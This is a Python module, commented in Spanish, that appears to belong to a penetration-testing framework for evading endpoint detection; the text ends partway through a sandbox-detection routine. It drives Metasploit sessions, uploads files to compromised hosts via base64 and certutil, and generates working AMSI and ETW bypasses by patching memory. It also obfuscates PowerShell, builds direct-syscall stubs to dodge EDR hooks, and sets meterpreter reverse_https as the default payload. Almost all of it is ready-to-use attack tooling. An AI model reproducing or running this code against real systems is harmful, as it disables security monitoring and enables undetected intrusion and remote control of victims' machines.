#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import argparse
import subprocess
import logging
import random
import time
import re
import base64
import hashlib
from datetime import datetime
from pymetasploit3.msfrpc import MsfRpcClient

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/pentest/temp/edr-evasion.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('edr-evasion')

class EdrEvasion:
    def __init__(self, config_file='/opt/pentest/config/evasion-config.json'):
        """Inicializa el módulo de evasión de EDR con configuración desde archivo"""
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            logger.error(f"Archivo de configuración no encontrado: {config_file}")
            # Configuración por defecto
            self.config = {
                "timeout": 60,
                "msf_host": "127.0.0.1",
                "msf_port": 55553,
                "msf_user": "msf",
                "msf_pass": "msf",
                "evasion_techniques": [
                    "amsi_bypass",
                    "etw_bypass",
                    "payload_obfuscation",
                    "memory_patching",
                    "sleep_obfuscation",
                    "encoding_layers",
                    "syscall_manipulation",
                    "sandbox_detection"
                ],
                "default_payload": "windows/meterpreter/reverse_https",
                "lhost": "127.0.0.1",
                "lport_range": [4000, 4500],
                "temp_directory": "/tmp",
                "obfuscation_iterations": 3
            }
        
        # Comprobar si se está ejecutando metasploit RPC
        self.msf_client = None
        self.msf_initialized = False
        self.attempts_to_start_msf = 0
        self.max_attempts = 3
    
    def initialize_msf(self):
        """Inicializa la conexión con Metasploit Framework RPC"""
        if self.msf_initialized:
            return True
        
        if self.attempts_to_start_msf >= self.max_attempts:
            logger.error("Número máximo de intentos para iniciar MSF alcanzado")
            return False
        
        try:
            # Intentar conectar con el servicio RPC existente
            self.msf_client = MsfRpcClient(
                self.config.get("msf_pass", "msf"),
                server=self.config.get("msf_host", "127.0.0.1"),
                port=self.config.get("msf_port", 55553),
                ssl=False,
                username=self.config.get("msf_user", "msf")
            )
            
            # Verificar la conexión
            if self.msf_client and hasattr(self.msf_client, 'core'):
                msf_version = self.msf_client.core.version()
                logger.info(f"Conexión establecida con Metasploit Framework: {msf_version}")
                self.msf_initialized = True
                return True
            else:
                raise Exception("Conexión establecida pero API no accesible")
        
        except Exception as e:
            logger.warning(f"Error al conectar con Metasploit RPC: {str(e)}")
            logger.info(f"Intentando iniciar el servicio MSF RPC (intento {self.attempts_to_start_msf + 1})")
            
            # Iniciar el servicio MSF RPC
            try:
                cmd = [
                    "msfrpcd",
                    "-P", self.config.get("msf_pass", "msf"),
                    "-U", self.config.get("msf_user", "msf"),
                    "-a", self.config.get("msf_host", "127.0.0.1"),
                    "-p", str(self.config.get("msf_port", 55553)),
                    "-S", "false"
                ]
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(10)  # Dar tiempo a que inicie
                
                self.attempts_to_start_msf += 1
                return self.initialize_msf()  # Intentar reconectar
            except Exception as e:
                logger.error(f"Error al iniciar servicio MSF RPC: {str(e)}")
                self.attempts_to_start_msf += 1
                return False
    
    def run_command_on_session(self, session_id, command, timeout=30):
        """Ejecuta un comando en una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return None
        
        try:
            # Verificar tipo de sesión
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return None
            
            session = self.msf_client.sessions.session(session_id)
            session_type = sessions[str(session_id)]['type']
            
            result = None
            
            # Ejecutar comando según tipo de sesión
            if session_type == 'meterpreter':
                # Ejecutar comando en meterpreter
                result = session.run_with_output(command, timeout)
            
            elif session_type in ['shell', 'ssh']:
                # Ejecutar comando en shell
                session.write(f"{command}\n")
                
                # Esperar respuesta
                time.sleep(2)  # Dar tiempo a que se ejecute
                
                # Leer resultado
                result = session.read()
                
                # Esperar más tiempo para comandos largos
                attempts = 0
                while "..." in result and attempts < 5:
                    time.sleep(1)
                    result += session.read()
                    attempts += 1
            
            return result
        
        except Exception as e:
            logger.error(f"Error al ejecutar comando en sesión: {str(e)}")
            return None
    
    def upload_file_to_session(self, session_id, local_file, remote_file):
        """Sube un archivo a una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return False
        
        try:
            # Verificar tipo de sesión
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return False
            
            session = self.msf_client.sessions.session(session_id)
            session_type = sessions[str(session_id)]['type']
            
            # Solo meterpreter soporta upload directo
            if session_type == 'meterpreter':
                result = session.run_with_output(f"upload {local_file} {remote_file}")
                return "uploaded" in result.lower()
            
            elif session_type == 'shell':
                # Para shell, codificar archivo en base64 y decodificar en destino
                try:
                    # Leer archivo y codificar
                    with open(local_file, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                    
                    # Comprobar si es sistema Windows o Unix
                    result = self.run_command_on_session(session_id, "uname -a")
                    is_windows = "Windows" in result
                    
                    if is_windows:
                        # En Windows, usar certutil
                        temp_b64 = remote_file + ".b64"
                        
                        # Escribir contenido codificado en archivo temporal
                        for i in range(0, len(file_data), 500):
                            chunk = file_data[i:i+500]
                            echo_cmd = f'echo {chunk} >> {temp_b64}'
                            self.run_command_on_session(session_id, echo_cmd)
                        
                        # Decodificar con certutil
                        decode_cmd = f'certutil -decode {temp_b64} {remote_file}'
                        self.run_command_on_session(session_id, decode_cmd)
                        
                        # Eliminar archivo temporal
                        self.run_command_on_session(session_id, f'del {temp_b64}')
                        
                    else:
                        # En Unix, usar base64
                        temp_b64 = remote_file + ".b64"
                        
                        # Escribir contenido codificado en archivo temporal
                        for i in range(0, len(file_data), 500):
                            chunk = file_data[i:i+500]
                            echo_cmd = f'echo "{chunk}" >> {temp_b64}'
                            self.run_command_on_session(session_id, echo_cmd)
                        
                        # Decodificar con base64
                        decode_cmd = f'base64 -d {temp_b64} > {remote_file}'
                        self.run_command_on_session(session_id, decode_cmd)
                        
                        # Dar permisos de ejecución
                        self.run_command_on_session(session_id, f'chmod +x {remote_file}')
                        
                        # Eliminar archivo temporal
                        self.run_command_on_session(session_id, f'rm {temp_b64}')
                    
                    return True
                
                except Exception as e:
                    logger.error(f"Error al subir archivo a sesión shell: {str(e)}")
                    return False
            
            return False
        
        except Exception as e:
            logger.error(f"Error al subir archivo: {str(e)}")
            return False
    
    def generate_amsi_bypass(self, method="memory_patching"):
        """Genera código para evadir AMSI (Windows Antimalware Scan Interface)"""
        # Diferentes técnicas para evadir AMSI
        bypass_methods = {
            "memory_patching": '''
            $Win32 = @"
            using System;
            using System.Runtime.InteropServices;
            
            public class Win32 {
                [DllImport("kernel32")]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
                
                [DllImport("kernel32")]
                public static extern IntPtr LoadLibrary(string name);
                
                [DllImport("kernel32")]
                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            }
            "@
            
            Add-Type $Win32
            
            $amsiDll = [Win32]::LoadLibrary("amsi.dll")
            $amsiScanBufferPtr = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
            
            $oldProtect = 0
            [Win32]::VirtualProtect($amsiScanBufferPtr, [UIntPtr]::new(5), 0x40, [ref]$oldProtect)
            
            $patch = [Byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBufferPtr, 6)
            
            $newProtect = 0
            [Win32]::VirtualProtect($amsiScanBufferPtr, [UIntPtr]::new(5), $oldProtect, [ref]$newProtect)
            ''',
            
            "reflection": '''
            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            ''',
            
            "context_override": '''
            $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
            '''
        }
        
        # Si el método especificado no existe, usar uno aleatorio
        if method not in bypass_methods:
            method = random.choice(list(bypass_methods.keys()))
        
        # Ofuscar ligeramente el código
        code = bypass_methods[method]
        
        # Reemplazar nombres de variables con nombres aleatorios
        var_names = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'Win32', 'amsiDll', 'amsiScanBufferPtr', 'oldProtect', 'patch', 'newProtect']
        for var in var_names:
            if var in code:
                random_var = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
                code = code.replace(var, random_var)
        
        return code.strip()
    
    def generate_etw_bypass(self, method="patching"):
        """Genera código para evadir ETW (Event Tracing for Windows)"""
        # Diferentes técnicas para evadir ETW
        bypass_methods = {
            "patching": '''
            $Win32 = @"
            using System;
            using System.Runtime.InteropServices;
            
            public class Win32 {
                [DllImport("kernel32")]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
                
                [DllImport("kernel32")]
                public static extern IntPtr LoadLibrary(string name);
                
                [DllImport("kernel32")]
                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            }
            "@
            
            Add-Type $Win32
            
            $ntdll = [Win32]::LoadLibrary("ntdll.dll")
            $etwEventWritePtr = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
            
            $oldProtect = 0
            [Win32]::VirtualProtect($etwEventWritePtr, [UIntPtr]::new(5), 0x40, [ref]$oldProtect)
            
            $patch = [Byte[]]@(0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwEventWritePtr, 6)
            
            $newProtect = 0
            [Win32]::VirtualProtect($etwEventWritePtr, [UIntPtr]::new(5), $oldProtect, [ref]$newProtect)
            ''',
            
            "unmanaged_code": '''
            $key = [Byte[]]@(0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
            
            $DllName = "ntdll.dll"
            $FunctionName = "EtwEventWrite"
            $DllPath = "$([Environment]::SystemDirectory)\\$DllName"
            
            $PEBytes = [System.IO.File]::ReadAllBytes($DllPath)
            
            # Get location of function in dll
            $BufferOffset = 0
            $Handle = [System.Runtime.InteropServices.GCHandle]::Alloc($PEBytes, [System.Runtime.InteropServices.GCHandleType]::Pinned)
            $PEAddress = $Handle.AddrOfPinnedObject()
            
            # PE Header Offset
            $BufferOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + 0x3C)
            
            # Section Count
            $NumSections = [System.Runtime.InteropServices.Marshal]::ReadInt16($PEAddress.ToInt32() + $BufferOffset + 0x6)
            
            # Optional Header Size
            $OptionalHeaderSize = [System.Runtime.InteropServices.Marshal]::ReadInt16($PEAddress.ToInt32() + $BufferOffset + 0x14)
            
            # Starting offset to the Section Headers
            $SectionOffset = $BufferOffset + 0x18 + $OptionalHeaderSize
            
            $ExportDirRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $BufferOffset + 0x78)
            
            $SectionHeaderOffset = 0
            $ExportSectionOffset = 0
            
            for ($i = 0; $i -lt $NumSections; $i++) {
                $SectionSize = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $SectionHeaderOffset + 0x8)
                $PhysicalAddress = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $SectionHeaderOffset + 0x14)
                
                if ($ExportDirRVA -ge $VirtualAddress -and $ExportDirRVA -lt ($VirtualAddress + $SectionSize)) {
                    $ExportSectionOffset = $PhysicalAddress - $VirtualAddress
                    break
                }
            }
            
            $ExportDirOffset = $ExportDirRVA + $ExportSectionOffset
            
            $OrdinalBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $ExportDirOffset + 0x10)
            $NumberOfNames = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $ExportDirOffset + 0x18)
            $AddressOfFunctions = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $ExportDirOffset + 0x1C)
            $AddressOfNames = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $ExportDirOffset + 0x20)
            $AddressOfOrdinals = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEAddress.ToInt32() + $ExportDirOffset + 0x24)
            
            $AddressOfNamesPtr = $PEAddress.ToInt32() + $AddressOfNames + $ExportSectionOffset
            
            for ($i = 0; $i -lt $NumberOfNames; $i++) {
                $FuncNameRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($AddressOfNamesPtr + ($i * 4))
                $FuncNameAddr = $PEAddress.ToInt32() + $FuncNameRVA + $ExportSectionOffset
                $FuncName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((New-Object System.IntPtr $FuncNameAddr))
                
                if ($FuncName -eq $FunctionName) {
                    $OrdinalPtr = $PEAddress.ToInt32() + $AddressOfOrdinals + $ExportSectionOffset + ($i * 2)
                    $Ordinal = [System.Runtime.InteropServices.Marshal]::ReadInt16($OrdinalPtr)
                    $FuncRVAPtr = $PEAddress.ToInt32() + $AddressOfFunctions + $ExportSectionOffset + (($Ordinal - $OrdinalBase) * 4)
                    $FuncRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($FuncRVAPtr)
                    $FuncAddr = $PEAddress.ToInt32() + $FuncRVA + $ExportSectionOffset
                    
                    # Patch the function
                    $oldProtect = 0
                    $vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((New-Object System.IntPtr([Int32] 0x7ffe0308)), [Type][VirtualProtect])
                    $vp.Invoke($FuncAddr, [UInt32]$key.Length, [UInt32]0x40, [ref]$oldProtect)
                    
                    for ($j = 0; $j -lt $key.Length; $j++) {
                        [System.Runtime.InteropServices.Marshal]::WriteByte((New-Object System.IntPtr($FuncAddr + $j)), $key[$j])
                    }
                    
                    $vp.Invoke($FuncAddr, [UInt32]$key.Length, [UInt32]$oldProtect, [ref]$oldProtect)
                    
                    break
                }
            }
            
            $Handle.Free()
            '''
        }
        
        # Si el método especificado no existe, usar uno aleatorio
        if method not in bypass_methods:
            method = random.choice(list(bypass_methods.keys()))
        
        # Ofuscar ligeramente el código
        code = bypass_methods[method]
        
        # Reemplazar nombres de variables con nombres aleatorios
        var_names = ['Win32', 'ntdll', 'etwEventWritePtr', 'oldProtect', 'patch', 'newProtect', 
                     'key', 'DllName', 'FunctionName', 'DllPath', 'PEBytes', 'BufferOffset', 
                     'Handle', 'PEAddress', 'NumSections', 'OptionalHeaderSize', 'SectionOffset', 
                     'ExportDirRVA', 'SectionHeaderOffset', 'ExportSectionOffset']
        
        for var in var_names:
            if var in code:
                random_var = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
                code = code.replace(var, random_var)
        
        return code.strip()
    
    def apply_powershell_obfuscation(self, code):
        """Aplica técnicas de ofuscación a código PowerShell"""
        # 1. Reemplazar comandos comunes con alias
        command_aliases = {
            'Write-Output': 'echo',
            'Get-Content': 'cat',
            'Set-Content': 'sc',
            'Get-ChildItem': 'ls',
            'Invoke-Expression': 'iex',
            'Select-Object': 'select',
            'Where-Object': '?',
            'ForEach-Object': '%'
        }
        
        for cmd, alias in command_aliases.items():
            code = re.sub(r'\b' + re.escape(cmd) + r'\b', alias, code)
        
        # 2. Insertar comillas y espacios aleatorios
        tokens = re.findall(r'[\w\-]+|\[|\]|\(|\)|{|}|;|=|\+|\$|@|"[^"]*"|\'[^\']*\'|`[\w]', code)
        obfuscated_code = ''
        
        for token in tokens:
            # No modificar cadenas entre comillas
            if token.startswith('"') or token.startswith("'") or token.startswith('`'):
                obfuscated_code += token
            else:
                # Introducir espacios aleatorios
                if random.random() < 0.3 and token not in [';', '(', ')', '[', ']', '{', '}', '=', '+']:
                    token = ' ' + token + ' '
                
                obfuscated_code += token
        
        # 3. Convertir strings a formato char array concatenado
        def replace_string(match):
            s = match.group(1)
            if len(s) < 3:  # No merece la pena para strings muy cortos
                return '"' + s + '"'
            
            char_array = []
            for char in s:
                if char == '"' or char == "'":
                    char_array.append(f"'{char}'")
                else:
                    char_array.append(f'"{char}"')
            
            return f"$({''.join(char_array) + ' -join ''' })"
        
        obfuscated_code = re.sub(r'"([^"]+)"', replace_string, obfuscated_code)
        
        # 4. Aleatorizar el uso de mayúsculas y minúsculas en cmdlets y variables
        def randomize_case(match):
            word = match.group(0)
            randomized = ''.join(random.choice([c.upper(), c.lower()]) for c in word)
            return randomized
        
        obfuscated_code = re.sub(r'\b(get|set|new|add|remove|start|stop)\b', randomize_case, obfuscated_code, flags=re.IGNORECASE)
        
        return obfuscated_code
    
    def generate_syscall_evasion(self, platform="windows"):
        """Genera código para evadir detección a nivel de syscalls"""
        syscall_evasion = {
            "windows": {
                "direct_syscalls": '''
                // Ejemplo de carga dinámica de syscalls para evadir hooks
                
                #include <windows.h>
                #include <stdio.h>
                
                // Define estructuras para syscalls directos
                typedef struct _UNICODE_STRING {
                    USHORT Length;
                    USHORT MaximumLength;
                    PWSTR  Buffer;
                } UNICODE_STRING, *PUNICODE_STRING;
                
                typedef struct _OBJECT_ATTRIBUTES {
                    ULONG Length;
                    HANDLE RootDirectory;
                    PUNICODE_STRING ObjectName;
                    ULONG Attributes;
                    PVOID SecurityDescriptor;
                    PVOID SecurityQualityOfService;
                } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
                
                typedef struct _IO_STATUS_BLOCK {
                    union {
                        NTSTATUS Status;
                        PVOID Pointer;
                    };
                    ULONG_PTR Information;
                } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
                
                typedef NTSTATUS(NTAPI *pNtCreateFile)(
                    OUT PHANDLE FileHandle,
                    IN ACCESS_MASK DesiredAccess,
                    IN POBJECT_ATTRIBUTES ObjectAttributes,
                    OUT PIO_STATUS_BLOCK IoStatusBlock,
                    IN PLARGE_INTEGER AllocationSize OPTIONAL,
                    IN ULONG FileAttributes,
                    IN ULONG ShareAccess,
                    IN ULONG CreateDisposition,
                    IN ULONG CreateOptions,
                    IN PVOID EaBuffer OPTIONAL,
                    IN ULONG EaLength
                );
                
                void InitUnicodeString(PUNICODE_STRING target, PCWSTR source) {
                    if (source) {
                        USHORT length = 0;
                        while (source[length] != L'\\0') {
                            length++;
                        }
                        target->Length = length * sizeof(WCHAR);
                        target->MaximumLength = (length + 1) * sizeof(WCHAR);
                        target->Buffer = (PWSTR)source;
                    } else {
                        target->Length = 0;
                        target->MaximumLength = 0;
                        target->Buffer = NULL;
                    }
                }
                
                int main() {
                    // Cargar ntdll.dll dinámicamente
                    HANDLE hFile;
                    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
                    
                    if (!hNtdll) {
                        printf("Error al cargar ntdll.dll\\n");
                        return 1;
                    }
                    
                    // Obtener dirección de NtCreateFile
                    pNtCreateFile NtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
                    
                    if (!NtCreateFile) {
                        printf("Error al obtener NtCreateFile\\n");
                        return 1;
                    }
                    
                    // Crear archivo usando syscall directo
                    UNICODE_STRING fileName;
                    WCHAR fileNameBuffer[] = L"\\\\??\\\\C:\\\\temp\\\\test.txt";
                    InitUnicodeString(&fileName, fileNameBuffer);
                    
                    OBJECT_ATTRIBUTES objAttr;
                    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
                    objAttr.RootDirectory = NULL;
                    objAttr.ObjectName = &fileName;
                    objAttr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
                    objAttr.SecurityDescriptor = NULL;
                    objAttr.SecurityQualityOfService = NULL;
                    
                    IO_STATUS_BLOCK ioStatusBlock;
                    
                    NTSTATUS status = NtCreateFile(
                        &hFile,
                        GENERIC_WRITE | GENERIC_READ,
                        &objAttr,
                        &ioStatusBlock,
                        NULL,
                        FILE_ATTRIBUTE_NORMAL,
                        FILE_SHARE_READ,
                        FILE_OVERWRITE_IF,
                        FILE_NON_DIRECTORY_FILE,
                        NULL,
                        0
                    );
                    
                    if (status != 0) {
                        printf("Error al crear archivo: %X\\n", status);
                        return 1;
                    }
                    
                    CloseHandle(hFile);
                    printf("Archivo creado exitosamente\\n");
                    
                    return 0;
                }
                ''',
                
                "syscall_shellcode": '''
                // Implementación de syscalls dinámicos para evadir hooks de EDR
                
                #include <windows.h>
                #include <stdio.h>
                
                // Estructura para extraer syscall IDs
                typedef struct _SYSTEM_MODULE_INFORMATION {
                    PVOID Reserved[2];
                    PVOID Base;
                    ULONG Size;
                    ULONG Flags;
                    USHORT Index;
                    USHORT Unknown;
                    USHORT LoadCount;
                    USHORT ModuleNameOffset;
                    CHAR ImageName[256];
                } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
                
                // Shellcode para ejecutar syscall directo x64
                #ifdef _M_X64
                #define SYSCALL_STUB_SIZE 23
                
                const unsigned char syscallStub[] = {
                    0x4C, 0x8B, 0xD1,               // mov r10, rcx
                    0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, 0x00000000
                    0x0F, 0x05,                    // syscall
                    0xC3                           // ret
                };
                #else
                // x86 para Windows 7 y anteriores con sysenter
                #define SYSCALL_STUB_SIZE 11
                
                const unsigned char syscallStub[] = {
                    0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, 0x00000000
                    0x0F, 0x34,                    // sysenter
                    0xC3                           // ret
                };
                #endif
                
                typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory)(
                    HANDLE ProcessHandle,
                    PVOID *BaseAddress,
                    ULONG_PTR ZeroBits,
                    PSIZE_T RegionSize,
                    ULONG AllocationType,
                    ULONG Protect
                );
                
                typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(
                    HANDLE ProcessHandle,
                    PVOID *BaseAddress,
                    PSIZE_T RegionSize,
                    ULONG NewProtect,
                    PULONG OldProtect
                );
                
                typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(
                    PHANDLE ThreadHandle,
                    ACCESS_MASK DesiredAccess,
                    PVOID ObjectAttributes,
                    HANDLE ProcessHandle,
                    PVOID StartRoutine,
                    PVOID Argument,
                    ULONG CreateFlags,
                    SIZE_T ZeroBits,
                    SIZE_T StackSize,
                    SIZE_T MaximumStackSize,
                    PVOID AttributeList
                );
                
                // Función para extraer el número de syscall
                DWORD GetSyscallNumber(const char* functionName) {
                    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
                    if (!hNtdll) return 0;
                    
                    BYTE* funcAddr = (BYTE*)GetProcAddress(hNtdll, functionName);
                    if (!funcAddr) return 0;
                    
                    // En x64, el patrón es típicamente:
                    // mov r10, rcx
                    // mov eax, <syscall_number>
                    // syscall
                    // ret
                    #ifdef _M_X64
                    if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B && funcAddr[2] == 0xD1 &&
                        funcAddr[3] == 0xB8) {
                        return *(DWORD*)(funcAddr + 4);
                    }
                    #else
                    // En x86, el patrón depende del Windows pero generalmente:
                    // mov eax, <syscall_number>
                    // mov edx, <address>
                    // call edx
                    if (funcAddr[0] == 0xB8) {
                        return *(DWORD*)(funcAddr + 1);
                    }
                    #endif
                    
                    return 0;
                }
                
                // Función para crear stub de syscall para una función específica
                PVOID CreateSyscallStub(const char* functionName) {
                    DWORD syscallNum = GetSyscallNumber(functionName);
                    if (syscallNum == 0) return NULL;
                    
                    // Crear shellcode
                    PVOID execMem = VirtualAlloc(NULL, SYSCALL_STUB_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (!execMem) return NULL;
                    
                    // Copiar shellcode
                    memcpy(execMem, syscallStub, SYSCALL_STUB_SIZE);
                    
                    // Insertar número de syscall
                    #ifdef _M_X64
                    *(DWORD*)((BYTE*)execMem + 4) = syscallNum;
                    #else
                    *(DWORD*)((BYTE*)execMem + 1) = syscallNum;
                    #endif
                    
                    return execMem;
                }
                
                int main() {
                    // Crear stub para NtAllocateVirtualMemory
                    PVOID ntAllocStub = CreateSyscallStub("NtAllocateVirtualMemory");
                    if (!ntAllocStub) {
                        printf("Error al crear stub para NtAllocateVirtualMemory\\n");
                        return 1;
                    }
                    
                    // Crear stub para NtProtectVirtualMemory
                    PVOID ntProtectStub = CreateSyscallStub("NtProtectVirtualMemory");
                    if (!ntProtectStub) {
                        printf("Error al crear stub para NtProtectVirtualMemory\\n");
                        VirtualFree(ntAllocStub, 0, MEM_RELEASE);
                        return 1;
                    }
                    
                    // Ejemplo de uso de syscall directo
                    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)ntAllocStub;
                    
                    PVOID baseAddress = NULL;
                    SIZE_T regionSize = 4096;
                    
                    NTSTATUS status = NtAllocateVirtualMemory(
                        GetCurrentProcess(),
                        &baseAddress,
                        0,
                        &regionSize,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE
                    );
                    
                    if (status != 0) {
                        printf("Error al llamar NtAllocateVirtualMemory: %X\\n", status);
                        VirtualFree(ntAllocStub, 0, MEM_RELEASE);
                        VirtualFree(ntProtectStub, 0, MEM_RELEASE);
                        return 1;
                    }
                    
                    printf("Memoria asignada exitosamente en: %p\\n", baseAddress);
                    
                    // Limpiar
                    VirtualFree(baseAddress, 0, MEM_RELEASE);
                    VirtualFree(ntAllocStub, 0, MEM_RELEASE);
                    VirtualFree(ntProtectStub, 0, MEM_RELEASE);
                    
                    return 0;
                }
                '''
            },
            "linux": {
                "direct_syscalls": '''
                // Ejemplo de syscalls directos en Linux para evadir hooks
                
                #include <stdio.h>
                #include <stdlib.h>
                #include <unistd.h>
                #include <string.h>
                
                // Syscall directo para open (utilizando ensamblador en línea)
                #ifdef __x86_64__
                static int syscall_open(const char *path, int flags, mode_t mode) {
                    int fd;
                    __asm__ volatile(
                        "syscall"
                        : "=a" (fd)
                        : "0" (2), "D" (path), "S" (flags), "d" (mode)
                        : "rcx", "r11", "memory"
                    );
                    return fd;
                }
                #else
                static int syscall_open(const char *path, int flags, mode_t mode) {
                    int fd;
                    __asm__ volatile(
                        "int $0x80"
                        : "=a" (fd)
                        : "0" (5), "b" (path), "c" (flags), "d" (mode)
                        : "memory"
                    );
                    return fd;
                }
                #endif
                
                // Syscall directo para write
                #ifdef __x86_64__
                static int syscall_write(int fd, const void *buf, size_t count) {
                    int ret;
                    __asm__ volatile(
                        "syscall"
                        : "=a" (ret)
                        : "0" (1), "D" (fd), "S" (buf), "d" (count)
                        : "rcx", "r11", "memory"
                    );
                    return ret;
                }
                #else
                static int syscall_write(int fd, const void *buf, size_t count) {
                    int ret;
                    __asm__ volatile(
                        "int $0x80"
                        : "=a" (ret)
                        : "0" (4), "b" (fd), "c" (buf), "d" (count)
                        : "memory"
                    );
                    return ret;
                }
                #endif
                
                // Syscall directo para close
                #ifdef __x86_64__
                static int syscall_close(int fd) {
                    int ret;
                    __asm__ volatile(
                        "syscall"
                        : "=a" (ret)
                        : "0" (3), "D" (fd)
                        : "rcx", "r11", "memory"
                    );
                    return ret;
                }
                #else
                static int syscall_close(int fd) {
                    int ret;
                    __asm__ volatile(
                        "int $0x80"
                        : "=a" (ret)
                        : "0" (6), "b" (fd)
                        : "memory"
                    );
                    return ret;
                }
                #endif
                
                // Syscall directo para exit
                #ifdef __x86_64__
                static void syscall_exit(int status) {
                    __asm__ volatile(
                        "syscall"
                        :
                        : "a" (60), "D" (status)
                        : "rcx", "r11", "memory"
                    );
                    __builtin_unreachable();
                }
                #else
                static void syscall_exit(int status) {
                    __asm__ volatile(
                        "int $0x80"
                        :
                        : "a" (1), "b" (status)
                        : "memory"
                    );
                    __builtin_unreachable();
                }
                #endif
                
                int main() {
                    const char *filename = "/tmp/test.txt";
                    const char *message = "Hello, direct syscall!\\n";
                    
                    // Abrir archivo
                    int fd = syscall_open(filename, 0x42 | 0x01, 0666); // O_CREAT | O_WRONLY = 0x42 | 0x01
                    if (fd < 0) {
                        printf("Error al abrir archivo\\n");
                        return 1;
                    }
                    
                    // Escribir en archivo
                    int ret = syscall_write(fd, message, strlen(message));
                    if (ret < 0) {
                        printf("Error al escribir en archivo\\n");
                        syscall_close(fd);
                        return 1;
                    }
                    
                    // Cerrar archivo
                    syscall_close(fd);
                    
                    printf("Archivo escrito exitosamente\\n");
                    
                    return 0;
                }
                '''
            }
        }
        
        if platform not in syscall_evasion:
            platform = "windows"
        
        return random.choice(list(syscall_evasion[platform].values()))
    
    def apply_sandbox_detection(self, code, platform="windows"):
        """Aplica técnicas de detección de sandbox a código existente"""
        sandbox_detection_code = {
            "windows": {
                "powershell": '''
                # Técnicas de detección de sandbox
                function Test-Sandbox {
                    $isSandbox = $false
                    
                    # 1. Comprobar memoria total (sandboxes suelen tener poca memoria)
                    $memory = Get-WmiObject -Class Win32_ComputerSystem
                    if ($memory.TotalPhysicalMemory -lt 4GB) {
                        $isSandbox = $true
                    }
                    
                    # 2. Comprobar número de procesadores
                    $processors = (Get-WmiObject -Class Win32_Processor).NumberOfCores
                    if ($processors -lt 2) {
                        $isSandbox = $true
                    }
                    
                    # 3. Comprobar tiempo de actividad
                    $uptime = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
                    if ($uptime.TotalMinutes -lt 30) {
                        $isSandbox = $true
                    }
                    
                    # 4. Comprobar procesos típicos de análisis
                    $suspiciousProcesses = @(
                        "wireshark", "procmon", "procexp", "ollydbg", "processexplorer",
